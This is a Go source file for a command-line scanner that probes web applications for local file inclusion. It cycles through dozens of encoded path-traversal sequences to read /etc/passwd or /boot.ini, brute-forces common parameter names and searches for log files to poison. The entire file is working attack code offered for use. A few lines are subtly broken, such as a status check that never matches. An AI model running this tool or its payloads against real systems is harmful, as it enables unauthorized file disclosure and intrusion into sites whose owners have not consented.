package main

import (
	"bufio"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"

	"github.com/gookit/color"
)

//Request URL, return responseBody (Function)
func webRequest(urlFlag string, cookieFlag string, userAgentFlag string) ([]byte, string) {

	// Declare http client
	client := &http.Client{}

	// Declare HTTP Method and Url
	request, err := http.NewRequest("GET", urlFlag, nil)

	// Set cookie
	request.Header.Set("Cookie", cookieFlag)
	request.Header.Set("User-Agent", userAgentFlag)
	resp, err := client.Do(request)
	// Read response
	body, err := ioutil.ReadAll(resp.Body)

	// error handle
	if err != nil {
		//fmt.Printf("error = %s \n", err)
		color.Error.Printf(err.Error())
	}

	return body, resp.Status
}

//Check if vulnerable (Function)
func isVulnerable(osPayload string, targetUrl string, cookieFlag string, userAgentFlag string, LFIFile string, intrusionFlag int) {

	payload := make([]string, 1)
	listOfEncoders := []string{"../", "..%2f", "%2e%2e/", "%2e%2e%2f", "..%252f", "%252e%252e/", "%252e%252e%252f", "..\\", "..%255c", "%252e%252e\\", "..%5c", "%2e%2e\\", "%2e%2e%5c", "%252e%252e\\", "%252e%252e%255c", "..%c0%af", "%c0%ae%c0%ae/", "%c0%ae%c0%ae%c0%af", "..%25c0%25af", "%25c0%25ae%25c0%25ae/", "%25c0%25ae%25c0%25ae%25c0%25af", "..%c1%9c", "%c0%ae%c0%ae\\", "%c0%ae%c0%ae%c1%9c", "..%25c1%259c", "%25c0%25ae%25c0%25ae\\", "%25c0%25ae%25c0%25ae\\", "%25c0%25ae%25c0%25ae%25c1%259c", "..%%32%66", "%%32%65%%32%65/", "%%32%65%%32%65%%32%66", "..%%35%63", "%%32%65%%32%65/", "%%32%65%%32%65%%35%63", "\\../", "/..\\", ".../", "...\\", "..../", "....\\", "..%u2215", "%uff0e%uff0e/", "%uff0e%uff0e%u2215", "..%u2216", "..%uEFC8", "..%uF025", "%uff0e%uff0e\\", "%uff0e%uff0e%u2216", "..0x2f", "0x2e0x2e/", "0x2e0x2e0x2f", "..0x5c0", "0x2e0x2e\\", "0x2e0x2e0x5c", "..%c0%2f", "%c0%2e%c0%2e/", "%c0%2e%c0%2e%c0%2f", "..%c0%5c", "%c0%2e%c0%2e\\", "%c0%2e%c0%2e%c0%5c", "///%2e%2e%2f", "\\\\%2e%2e%5c", "..//", "..///", "..\\\\", "..\\\\", "./\\/./", ".\\/\\.\\", "./../", ".\\..\\", ".//..//", ".\\\\..\\\\", "%00../", ".%00./", "..%00/"}
	payload[0] = ""

	//create slice for quick search
	if intrusionFlag == 1 {
		//add 12 times the

		for i := 1; i < 13; i++ {
			for j := 0; j < 4; j++ {
				addString := strings.Repeat(listOfEncoders[j], i)
				payload = append(payload, addString)
			}
		}
	} else if intrusionFlag == 2 {
		//create slice for extensive search.
		for i := 1; i < 13; i++ {
			for j := 0; j < 27; j++ {
				addString := strings.Repeat(listOfEncoders[j], i)
				payload = append(payload, addString)
			}
		}
	} else if intrusionFlag == 3 {
		//create slice for extensive search.
		for i := 1; i < 13; i++ {
			for j := 0; j < 75; j++ {
				addString := strings.Repeat(listOfEncoders[j], i)
				payload = append(payload, addString)
			}
		}
	}

	//Initial LFI identification
	for i := 0; i < len(payload); i++ {
		targetUrl := targetUrl + payload[i] + LFIFile

		//make web request with payload
		byteRespBody, _ := webRequest(targetUrl, cookieFlag, userAgentFlag)

		//convert response body to string
		stringRespBody := string(byteRespBody)

		//return true if vulnerable to lfi
		vuln := strings.Contains(stringRespBody, osPayload)
		if vuln == true {
			color.Danger.Printf("[+] Vulnerable:")
			fmt.Println(" " + targetUrl)
			break
		}
	}

}

//find .log LFI's (Function)
func logSearch(urlFlag string, cookieFlag string, userAgentFlag string) {

	//Open wordlist file
	file, err := os.Open("./logList.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	byteRespBodyInital, _ := webRequest(urlFlag, cookieFlag, userAgentFlag)

	//read line, add it to URL and make a webRequest with the newURL
	scanner := bufio.NewScanner(file)

	color.Success.Println("[!] Searching for log files.\n")
	logFilesFound := make([]string, 0)

	for scanner.Scan() {
		lines := scanner.Text()

		if err := scanner.Err(); err != nil {
			log.Fatal(err)
		}

		newUrl := urlFlag + string(lines)
		byteRespBody, responseStatus := webRequest(newUrl, cookieFlag, userAgentFlag)
		if string(byteRespBodyInital) != string(byteRespBody) && responseStatus == "200" {
			color.Danger.Printf("[+] Vulnerable:")
			fmt.Println(" " + newUrl)
			logFilesFound = append(logFilesFound, newUrl)
		}
	}
	if len(logFilesFound) == 0 {
		color.Warn.Println("[-] No log files found.")
	}

}

func main() {

	color.Cyan.Printf("\n                              888                       \n                              888                       \n                              888                       \n888d888 .d88b.  88888b.d88b.  888      .d88b.   .d8888b \n888P\"  d8P  Y8b 888 \"888 \"88b 888     d88\"\"88b d88P\"    \n888    88888888 888  888  888 888     888  888 888      \n888    Y8b.     888  888  888 888     Y88..88P Y88b.    \n888     \"Y8888  888  888  888 88888888 \"Y88P\"   \"Y8888P \n\n\n")

	targetUrlFlag := flag.String("u", "http://127.0.0.1/?page=", "Target URL, -u http(s)://<IP>:<PORT>/?page= ")
	//wordlistFlag := flag.String("w", "", "Wordlist with valid directories for Enumeration.")
	cookieFlag := flag.String("c", "", "Cookie Value(s) for Authentication as a string.")
	userAgentFlag := flag.String("uA", "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0", "Set User-Agent as a string.")
	operatingSysFlag := flag.String("os", "default", "Target Operating System (windows/linux). Default tests for both.")
	intrusionFlag := flag.Int("i", 1, "Set Intrusion Level: 1 Quick Search, 2 Extensive Search, 3 GoHard")
	nullByteFlag := flag.Bool("n", false, " Add NullByte at the end of the file.")
	parameterFlag := flag.Bool("p", false, "Scan for vulnerable parameters.")
	logFlag := flag.Bool("log", false, "Set \"-log\" to identify potential LFI's for log poisoning.")
	flag.Parse()

	var LinFile string
	var WinFile string
	var urlFlagWithParam string
	listOfParameters := []string{"?cat=", "?dir=", "?action=", "?board=", "?board=", "?date=", "?file=", "?download=", "?path=", "?path=", "?folder=", "?include=", "?page=", "?inc=", "?locate=", "?show=", "?doc=", "?site=", "?type=", "?view=", "?content=", "?document=", "?layout=", "?mod=", "?mod="}
	lastUrlByte := strings.LastIndex(*targetUrlFlag, "=")

	if *logFlag == false {
		if *nullByteFlag == false {
			LinFile = "/etc/passwd"
			WinFile = "/boot.ini"
		} else if *nullByteFlag == true {
			LinFile = "/etc/passwd%00"
			WinFile = "/boot.ini%00"
		}

		color.Success.Printf("[!] Intrusion Level: ")
		color.Warn.Println(*intrusionFlag)
		color.Success.Println("[!] Initializing Payload List\n")

		if *parameterFlag == true && lastUrlByte == -1 {
			//scan the top 25 parameters.
			for i := 0; i < len(listOfParameters); i++ {
				urlFlagWithParam = *targetUrlFlag + listOfParameters[i]

				color.Notice.Println("[!] Scanning...")

				if *operatingSysFlag == "linux" {
					isVulnerable(":root:", urlFlagWithParam, *cookieFlag, *userAgentFlag, LinFile, *intrusionFlag)
				} else if *operatingSysFlag == "windows" {
					isVulnerable("[boot loader]", urlFlagWithParam, *cookieFlag, *userAgentFlag, WinFile, *intrusionFlag)
				} else {
					isVulnerable(":root:", urlFlagWithParam, *cookieFlag, *userAgentFlag, LinFile, *intrusionFlag)
					isVulnerable("[boot loader]", urlFlagWithParam, *cookieFlag, *userAgentFlag, WinFile, *intrusionFlag)
				}
			}
		} else if *parameterFlag == false && lastUrlByte != -1 {
			urlFlagWithParam = *targetUrlFlag

			//Scan for LFI.
			if *operatingSysFlag == "linux" {
				isVulnerable(":root:", urlFlagWithParam, *cookieFlag, *userAgentFlag, LinFile, *intrusionFlag)
			} else if *operatingSysFlag == "windows" {
				isVulnerable("[boot loader]", urlFlagWithParam, *cookieFlag, *userAgentFlag, WinFile, *intrusionFlag)
			} else {
				isVulnerable(":root:", urlFlagWithParam, *cookieFlag, *userAgentFlag, LinFile, *intrusionFlag)
				isVulnerable("[boot loader]", urlFlagWithParam, *cookieFlag, *userAgentFlag, WinFile, *intrusionFlag)
			}

		} else {
			color.Warn.Printf("[!] Syntax error: ")
			color.Info.Println("Example: \"-u http://localhost/?page=\" or \"-u http://localhost/ -p\" if you want to brute force the parameter.")
		}
	} else if *logFlag == true && *parameterFlag == false {
		if lastUrlByte == -1 {
			color.Warn.Printf("[!] Syntax error: ")
			color.Info.Println("Example: \"-u http://localhost/?page= -log\"")
		} else if lastUrlByte != -1 {
			logSearch(*targetUrlFlag, *cookieFlag, *userAgentFlag)
		}
	}
}
